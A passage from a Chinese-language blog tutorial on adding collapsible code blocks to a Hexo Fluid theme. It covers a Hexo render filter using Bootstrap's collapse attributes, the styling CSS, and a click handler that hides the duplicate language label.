#6A9955">// 生成唯一的折叠 ID</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 创建一个容器，用于包裹按钮和语言提示</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseContainer</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`</span></span><span class="line"><span style="color: #CE9178">        &lt;div class="collapse-header"&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;button class="collapse-btn collapsed" type="button" data-toggle="collapse" data-target="#</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">collapseId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">"&gt;</span></span><span class="line"><span style="color: #CE9178">            &lt;svg t="1730562455310" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9905"&gt;</span></span><span class="line"><span style="color: #CE9178">              &lt;path d="M857.766234 511.488511L345.623017 0 297.174825 49.348412 759.846873 511.488511 297.174825 974.651588 345.623017 1022.977023z" fill="#ffffff" p-id="9906"&gt;</span></span><span class="line"><span style="color: #CE9178">              &lt;/path&gt;</span></span><span class="line"><span style="color: #CE9178">            &lt;/svg&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;/button&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;span&gt;</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">lang</span><span style="color: #569CD6">}</span><span style="color: #CE9178">&lt;/span&gt; &lt;!-- 显示代码语言 --&gt;</span></span><span class="line"><span style="color: #CE9178">        &lt;/div&gt;</span></span><span class="line"><span style="color: #CE9178">      `</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// collapse表示默认收起，collapse show表示默认展开</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseDiv</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`&lt;div class="collapse" id="</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">collapseId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">"&gt;</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">inner</span><span style="color: #569CD6">}</span><span style="color: #CE9178">&lt;/div&gt;`</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">begin</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">collapseContainer</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">collapseDiv</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">end</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 返回修改后的内容</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 返回处理后的数据</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #B5CEA8">10000</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 设置优先级，使得在其他渲染后执行</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>这份代码的核心在于 <code>&lt;button class="collapse-btn collapsed"&gt;</code> 中的属性：</p><figure class="shiki javascript"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">-</span><span style="color: #9CDCFE">toggle</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collapse"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">-</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#${collapseId}"</span></span></code></pre></div></div></figure><p>为什么这么说呢？</p><p>当使用 <code>data-toggle="collapse"</code> 和 <code>data-target</code> 属性时，Bootstrap 的 JavaScript 会自动识别这些属性并处理折叠效果。这意味着我们<strong>不需要手动编写</strong>任何其他 JavaScript 代码来控制折叠内容的显示和隐藏。</p><p>处理过程是：</p><ol><li>当收起或展开按钮被点击时，Bootstrap 先查找与 <code>data-target</code> 属性对应的元素（这里是被加上了 <code>id="${collapseId}"</code> 的 <code>collapseDiv</code>）。</li><li>根据当前状态，Bootstrap 会往查找到的带 <code>data-target</code> 值（这里是 <code>collapseId</code>）的标签中添加或移除 <code>show</code> 类，从而控制折叠内容的显示或隐藏。<br>人话是：Bootstrap 会自动给 <code>const collapseDiv</code> 加上 <code>show</code> 类或移除来控制展开还是收起。<code>collapseDiv</code> 这里是代码块。</li><li>同时给按钮更新 <code>aria-expanded</code> 属性，以反映当前状态（值为 true 即展开反之则收起）。</li><li>同时给按钮增加 <code>collapsed</code> 类来标识收起状态，若无此类则表示展开。</li></ol><p>所以，这里有两个值的设定需要注意：</p><ol><li><code>const collapseDiv</code> 的 <code>class="collapse"</code>：<br>若类名为 <code>class="collapse"</code> 表示默认将代码块收起，<code>collapse show</code> 表示默认展开。</li><li><code>const collapseDiv</code> 的类名若为不带 show 的类名表示默认收起，则 <code>&lt;button class="collapse-btn collapsed"</code> 中的类名 <code>class="collapse-btn"</code> 需要加上 <code>collapsed</code>。<br>即：<code>class="collapse-btn collapsed"</code> 与 <code>collapseDiv</code> 收起或展开的状态保持一致。</li></ol><p>例如，我的代码默认行为是将代码块收起，所以要设置 <code>const collapseDiv</code> 为：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseDiv</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`&lt;div class="collapse" id="</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">collapseId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">"&gt;</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">inner</span><span style="color: #569CD6">}</span><span style="color: #CE9178">&lt;/div&gt;`</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p><strong>且</strong>按钮 button 应设置为：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collapse-btn collapsed"</span><span style="color: #D4D4D4"> </span><span style="color: #F44747">...略...</span></span></code></pre></div></div></figure><p>另外，你也可以找一个你喜欢的 svg 图用于设置按钮的图标。</p><blockquote><p>相关推荐：<a href="https://www.iconfont.cn/">阿里巴巴矢量图库</a></p></blockquote><h3 id="编写css"><a class="markdownIt-Anchor" href="#编写css"></a> 编写 css</h3><p>在 <code>source\css\</code> 目录下创建 <code>codeFloding.css</code>：</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 设置圆角，使背景更柔和 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 使按钮可以定位 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#303030</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 设置背景颜色为深灰色 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 添加上下左右各5px的内边距 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">span</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">white</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">button</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 去掉按钮的边框 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 按钮与语言文本之间的间隔 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#303030</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 按钮背景与容器背景相同 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">cursor</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">pointer</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 鼠标悬停时显示为手指光标，表示可点击 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition</span><span style="color: #D4D4D4">: transform </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ease</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 添加平滑的旋转过渡效果 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">button:focus</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 去掉按钮的聚焦样式，保持界面简洁 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">button</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">svg</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">fill</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">white</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition</span><span style="color: #D4D4D4">: transform </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ease</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 添加过渡效果 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/* 初始状态：箭头向右，为收起状态 */</span></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.collapse-btn.collapsed</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">rotate</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0deg</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #6A9955">/* 点击按钮后，箭头向下，为展开状态 */</span></span><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.collapse-btn</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">rotate</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">90deg</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/* 为展开的内容区域添加底部连接效果 */</span></span><span class="line"><span style="color: #D7BA7D">.collapse.show</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#303030</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.category-collapse.collapse.show</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">/* 将背景色设置为透明，使内容区域背景透明 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">transparent</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>有兴趣可以自行修改 css 样式使其符合你的审美。</p><div class="note warning flat"><p>warning</p><p>请注意在<code>_config.fluid.yml</code> 中进行引入</p></div><h3 id="一个可选的配置"><a class="markdownIt-Anchor" href="#一个可选的配置"></a> 一个可选的配置</h3><p>因为我默认开启了代码块的语言类型显示，所以在代码的右上角会自动显示代码语言，如果点击按钮将代码展开，则会在 header 上出现两个代码语言文字，一左一右不是很美观。</p><p>于是我创建了 <code>source\js\watch.js</code></p><div class="note info flat"><p><s>前情提要</s></p><p><code>watch.js</code> 是以前写的，你也可以找一个已经写过的 js 文件，在底部写，或是单独创建一个 js 文件用于编写。</p></div><p>为了解决上面的重复问题，编写 js 代码如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 给代码收起按钮添加监听事件</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseBtns</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelectorAll</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.collapse-header button'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">collapseBtns</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'click'</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取当前按钮的类名</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">btnClassName</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 使用 button 变量，而不是 collapseBtns</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">codeTypeSpan</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nextElementSibling</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 获取当前按钮后面的 span 标签</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log('当前获取到的按钮类名为：', btnClassName);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log('当前获取到的 span 标签为：', codeTypeSpan);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log('当前检测展开状态：', btnClassName.includes('collapsed'));</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">btnClassName</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">includes</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'collapsed'</span><span style="color: #D4D4D4">)) { </span><span style="color: #6A9955">// 判断按钮是否在展开状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 展开之后将 span 标签设为隐藏</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">codeTypeSpan</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'none'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 收起之后将 span 标签设为显示</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">codeTypeSpan</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'inline-block'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><p>这样一来，点击按钮展开之后，header 的代码语言提示问题将会被设为隐藏（并非卸载）。</p><h3 id="一个可选配置的优化"><a class="markdownIt-Anchor" href="#一个可选配置的优化"></a> 一个可选配置的优化</h3><p>为什么说是优化呢？因为实际使用下来，我发现每次都要手动使用鼠标点击那么小的一个按钮实在过于折磨，不如直接点击 header 实现折叠或展开。修改就不多说了，如果你能看懂上面的配置，那么下面的配置也能，因为我只做了小小的修改。</p><p><code>codeFloding.js</code>：将 <code>data-toggle</code> 和 <code>data-target</code> 换到 header 上，并在 watch.js 中手动切换 button 的 class 类名</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 获取唯一 ID</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getUuid</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">random</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">substring</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">8</span><span style="color: #D4D4D4">) + </span><span style="color: #9CDCFE">Date</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">now</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 注册 Hexo 的过滤器，在文章渲染后处理代码块</span></span><span class="line"><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">extend</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">filter</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">register</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"after_post_render"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  (</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">line_number</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">lib</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">highlight</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">lib</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"highlightjs"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">line_number</span><span style="color: #D4D4D4"> </span></span><span class="line"><span style="color: #D4D4D4">        ? </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;figure class="highlight.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">hljs </span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">figure&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4"> </span></span><span class="line"><span style="color: #D4D4D4">        : </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;div class="code-wrapper.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">hljs </span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">div&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">lib</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"prismjs"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4"> = </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;div class="code-wrapper.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">data-language="</span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">div&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4">, (</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">begin</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">inner</span><span style="color: #D4D4D4">, </span><span style="color: 